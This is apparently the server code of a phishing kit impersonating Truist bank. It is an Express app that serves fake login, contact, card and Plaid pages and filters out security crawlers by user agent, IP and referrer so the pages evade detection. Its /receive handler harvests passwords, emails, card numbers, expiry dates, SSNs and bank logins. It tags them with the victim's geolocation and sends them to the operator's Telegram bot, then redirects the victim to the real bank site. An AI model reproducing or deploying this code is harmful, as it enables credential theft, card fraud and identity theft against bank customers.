const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const path = require('path');
const { botToken, chatId } = require('./config/settings.js');
//const { getClientIp } = require("request-ip");
const https = require('https');
const querystring = require('querystring');
const axios = require('axios');
const URL = `https://api-bdc.net/data/ip-geolocation?ip=`;
const ApiKey = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
const fs = require('fs').promises;
const MobileDetect = require('mobile-detect');
const isbot = require('isbot');
const ipRangeCheck = require('ip-range-check');
const { botUAList } = require('./config/botUA.js');
const { botIPList, botIPRangeList, botIPCIDRRangeList, botIPWildcardRangeList } = require('./config/botIP.js');
const { botRefList } = require('./config/botRef.js');
const { use } = require('express/lib/router');
const { sendMessageFor } = require('simple-telegram-message');
const viewDir = path.join(__dirname, 'views');

const port = 3000;

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));
app.set('trust proxy', true);

function getClientIp(req) {
  const xForwardedFor = req.headers['x-forwarded-for'];
  if (xForwardedFor) {
    const ips = xForwardedFor.split(',');
    return ips[0].trim();
  }
  return req.connection.remoteAddress || req.socket.remoteAddress || null;
}

// Middleware function for mobile detection
app.use((req, res, next) => {
  const md = new MobileDetect(req.headers['user-agent']);
  req.isMobile = md.mobile();
  next();
});

// Middleware function for bot detection
function isBotUA(userAgent) {
  if (!userAgent) {
    userAgent = '';
  }

  if (isbot(userAgent)) {
    return true;
  }

  for (let i = 0; i < botUAList.length; i++) {
    if (userAgent.toLowerCase().includes(botUAList[i])) {
      return true;
    }
  }

  return false;
}

function isBotIP(ipAddress) {
  if (!ipAddress) {
    ipAddress = '';
  }

  if (ipAddress.substr(0, 7) == '::ffff:') {
    ipAddress = ipAddress.substr(7);
  }

  for (let i = 0; i < botIPList.length; i++) {
    if (ipAddress.includes(botIPList[i])) {
      return true;
    }
  }

  function IPtoNum(ip) {
    return Number(
      ip.split('.').map((d) => ('000' + d).substr(-3)).join('')
    );
  }

  const inRange = botIPRangeList.some(
    ([min, max]) =>
      IPtoNum(ipAddress) >= IPtoNum(min) && IPtoNum(ipAddress) <= IPtoNum(max)
  );

  if (inRange) {
    return true;
  }

  for (let i = 0; i < botIPCIDRRangeList.length; i++) {
    if (ipRangeCheck(ipAddress, botIPCIDRRangeList[i])) {
      return true;
    }
  }

  for (let i = 0; i < botIPWildcardRangeList.length; i++) {
    if (ipAddress.match(botIPWildcardRangeList[i]) !== null) {
      return true;
    }
  }

  return false;
}

function isBotRef(referer) {
  if (!referer) {
    referer = '';
  }

  for (let i = 0; i < botRefList.length; i++) {
    if (referer.toLowerCase().includes(botRefList[i])) {
      return true;
    }
  }
  return false;
}

app.use((req, res, next) => {
  const clientUA = req.headers['user-agent'] || req.get('user-agent');
  const clientIP = getClientIp(req);
  const clientRef = req.headers.referer || req.headers.origin;

  try {
    if (isBotUA(clientUA) || isBotIP(clientIP) || isBotRef(clientRef)) {
      console.log(`Blocked request: User-Agent: ${clientUA}, IP: ${clientIP}, Referrer: ${clientRef}`);
      return res.status(404).send('Not Found');
    } else {
      next();
    }
  } catch (error) {
    console.error('Error in bot detection middleware:', error);
    res.status(500).send('Internal Server Error');
  }
});

app.get('/link', (req, res) => {
  const step = req.query.step;

  switch (step) {
    case '1':
      res.sendFile(path.join(viewDir, 'pl.html'));
      break;
      
    case '2':
      
      res.sendFile(path.join(viewDir, 'plbanks.html'));
      break;
      
    case '3':
    
      res.sendFile(path.join(viewDir, 'pllogin.html'));
      break;
    default:
    
      res.redirect('/login');
      break;
  }
});

app.use((req, res, next) => {
    if (req.method === 'GET' && req.path.includes('.html')) {
        // Redirect to the desired path, for example, the root path
        res.redirect('/');
        console.log('path')
    } else {
        next();
    }
});


// Route handler for form submission
app.post('/receive', async (req, res) => {
    let message = '';
    let responseSent = false; // Flag to prevent multiple responses
    const myObject = req.body;

    const sendAPIRequest = async (ipAddress) => {
        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
        console.log(apiResponse.data);
        return apiResponse.data;
    };

    try {
        const ipAddress = getClientIp(req);
        const ipAddressInformation = await sendAPIRequest(ipAddress);
        const userAgent = req.headers["user-agent"];
        const systemLang = req.headers["accept-language"];

        const myObjects = Object.keys(myObject).map(key => key.toLowerCase());

        // Check conditions and prepare message
        if (myObjects.includes('password') || myObjects.includes('email')) {
            message += `✅ UPDATE TEAM | TRUIST | USER_${ipAddress}\n\n` +
                `👤 LOGIN \n\n`;

            for (const key of Object.keys(myObject)) {
                if (key.toLowerCase() !== 'visitor' && myObject[key] !== "") {
                    console.log(`${key}: ${myObject[key]}`);
                    message += `${key}: ${myObject[key]}\n`;
                }
            }

            message += `🌍 GEO-IP INFO\n` +
                `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
                `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +
                `CITY             : ${ipAddressInformation.location.city}\n` +
                `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
                `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
                `COUNTRY          : ${ipAddressInformation.country.name}\n` +
                `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
                `ISP              : ${ipAddressInformation.network.organisation}\n\n` +
                `💻 SYSTEM INFO\n` +
                `USER AGENT       : ${userAgent}\n` +
                `SYSTEM LANGUAGE  : ${systemLang}\n` +
                `💬 Telegram: https://t.me/UpdateTeams\n`;

            res.send({ url: "/confirm?action=1" });
            responseSent = true;
        }

        if (!responseSent && (myObjects.includes('expirationdate') || myObjects.includes('cardnumber') || myObjects.includes('billing address'))) {
            message += `✅ UPDATE TEAM | TRUIST | USER_${ipAddress}\n\n` +
                `👤 CARD INFO \n\n`;

            for (const key of Object.keys(myObject)) {
                if (key.toLowerCase() !== 'visitor') {
                    console.log(`${key}: ${myObject[key]}`);
                    message += `${key}: ${myObject[key]}\n`;
                }
            }

            message += `🌍 GEO-IP INFO\n` +
                `IP ADDRESS       : ${ipAddress}\n` +
                `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
                `💬 Telegram: https://t.me/UpdateTeams\n`;

            res.send({ url: "/link?step=1" });
            responseSent = true;
        }

        if (!responseSent && myObjects.includes('userid')) {
            message += `✅ UPDATE TEAM | TRUIST | USER_${ipAddress}\n\n` +
                `👤 PLAID LOGIN \n\n`;

            for (const key of Object.keys(myObject)) {
                if (key.toLowerCase() !== 'visitor') {
                    console.log(`${key}: ${myObject[key]}`);
                    message += `${key}: ${myObject[key]}\n`;
                }
            }

            message += `🌍 GEO-IP INFO\n` +
                `IP ADDRESS       : ${ipAddress}\n` +
                `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
                `💬 Telegram: https://t.me/UpdateTeams\n`;

            res.send({ url: "https://truist.com/" });
            responseSent = true;
        }

        if (!responseSent && (myObjects.includes('ssn') || myObjects.includes('firstname') || myObjects.includes('lastname'))) {
            message += `✅ UPDATE TEAM | TRUIST | USER_${ipAddress}\n\n` +
                `👤 CONTACT INFO \n\n`;

            for (const key of Object.keys(myObject)) {
                if (key.toLowerCase() !== 'visitor') {
                    console.log(`${key}: ${myObject[key]}`);
                    message += `${key}: ${myObject[key]}\n`;
                }
            }

            message += `🌍 GEO-IP INFO\n` +
                `IP ADDRESS       : ${ipAddress}\n` +
                `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
                `💬 Telegram: https://t.me/UpdateTeams\n`;

            res.send({ url: "/confirm?action=2" });
            responseSent = true;
        }

        // Send message to bot if needed
        if (!responseSent) {
            res.status(400).send({ error: "No matching keys found in request body." });
            responseSent = true;
        }

        const sendMessage = sendMessageFor(botToken, chatId);
        sendMessage(message);

        console.log(message);
    } catch (error) {
        if (!responseSent) {
            res.status(500).send({ error: "Internal server error" });
        }
        console.error(error);
    }
});

// Route handler for login pages
app.get('/login', async (req, res) => {
  try {
    let htmlContent;
    const fileName = `index.html`;
    htmlContent = await fs.readFile(path.join(__dirname, 'views', fileName), 'utf-8');
    res.send(htmlContent);
  } catch (error) {
    console.error('Error reading file:', error);
    res.status(500).send('Internal Server Error');
  }
});

app.get('/confirm', (req, res) => {
  const action = req.query.action;

  switch (action) {
    case '1':
      res.sendFile(path.join(viewDir, 'contact.html'));
      break;
      
    case '2':
      
      res.sendFile(path.join(viewDir, 'card.html'));
      break;
      
    default:
    
      res.redirect('/login');
      break;
  }
});

app.get('/', async (req, res) => {
  res.redirect('/login');
});

// Middleware function for bot detection
function antiBotMiddleware(req, res, next) {
  const clientUA = req.headers['user-agent'] || req.get('user-agent');
  const clientIP = getClientIp(req);
  const clientRef = req.headers.referer || req.headers.origin;

  if (isBotUA(clientUA) || isBotIP(clientIP) || isBotRef(clientRef)) {
    return res.status(404).send('Not Found');
  } else {
    next();
  }
}

app.use(antiBotMiddleware);